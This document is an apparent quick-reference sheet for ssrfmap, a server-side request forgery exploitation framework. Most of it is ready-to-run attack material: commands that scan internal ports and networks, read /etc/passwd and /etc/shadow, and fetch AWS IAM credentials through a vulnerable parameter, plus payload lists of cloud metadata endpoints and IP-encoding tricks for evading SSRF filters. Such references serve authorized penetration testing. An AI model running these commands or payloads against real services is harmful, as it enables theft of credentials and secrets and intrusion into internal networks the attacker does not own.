# ssrfmap

> SSRF exploitation framework with modules.

## Quickstart

```bash
# Basic test
ssrfmap -r request.txt -p url

# With module
ssrfmap -r request.txt -p url -m portscan

# AWS metadata
ssrfmap -r request.txt -p url -m readfiles --rfiles /etc/passwd
```

## Core Concepts

| Concept | Description |
|---------|-------------|
| SSRF | Server-Side Request Forgery |
| Modules | portscan, readfiles, AWS, etc. |
| Request file | Burp/raw HTTP request |

## Syntax

```text
ssrfmap -r <request.txt> -p <param> [options]
```

## Options

### Target

| Option | Description |
|--------|-------------|
| `-r <file>` | Request file |
| `-p <param>` | Vulnerable parameter |
| `-m <module>` | Module to use |

### Modules

| Module | Description |
|--------|-------------|
| `portscan` | Internal port scan |
| `readfiles` | Read local files |
| `aws` | AWS metadata |
| `gce` | GCE metadata |
| `alibaba` | Alibaba metadata |
| `networkscan` | Network scanning |
| `fastcgi` | FastCGI exploitation |
| `memcache` | Memcache exploitation |
| `redis` | Redis exploitation |
| `github` | GitHub metadata |
| `custom` | Custom exploitation |

### Output

| Option | Description |
|--------|-------------|
| `-v` | Verbose |
| `--level <n>` | Verbosity level |

## Recipes

### Basic SSRF Testing

```bash
# Create request file with SSRF point
# Replace URL with SSRF payload marker: *SSRF*

# Test
ssrfmap -r request.txt -p url
```

### Port Scanning

```bash
# Scan internal ports
ssrfmap -r request.txt -p url -m portscan

# Scan specific host
ssrfmap -r request.txt -p url -m portscan --target 192.168.1.1
```

### Cloud Metadata

```bash
# AWS metadata
ssrfmap -r request.txt -p url -m aws

# GCE metadata
ssrfmap -r request.txt -p url -m gce

# AWS with IAM credentials
ssrfmap -r request.txt -p url -m aws --lfi
```

### File Reading

```bash
# Read local files
ssrfmap -r request.txt -p url -m readfiles

# Specific files
ssrfmap -r request.txt -p url -m readfiles --rfiles /etc/passwd,/etc/shadow
```

### Service Exploitation

```bash
# Redis
ssrfmap -r request.txt -p url -m redis

# Memcache
ssrfmap -r request.txt -p url -m memcache

# FastCGI
ssrfmap -r request.txt -p url -m fastcgi
```

### Request File Format

```http
POST /api/fetch HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

url=*SSRF*
```

### Network Scan

```bash
# Scan internal network
ssrfmap -r request.txt -p url -m networkscan --target 192.168.1.0/24
```

## Common SSRF Payloads

```text
# Local
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0

# AWS Metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCE Metadata
http://metadata.google.internal/computeMetadata/v1/

# Bypass attempts
http://127.1
http://0177.0.0.1
http://2130706433
http://127.0.0.1.nip.io
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| No SSRF detected | Check parameter, try bypasses |
| Blocked internal | Try IP bypass techniques |
| No metadata | Cloud might block, try other methods |

## References

- [SSRFmap GitHub](https://github.com/swisskyrepo/SSRFmap)
- [SSRF PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
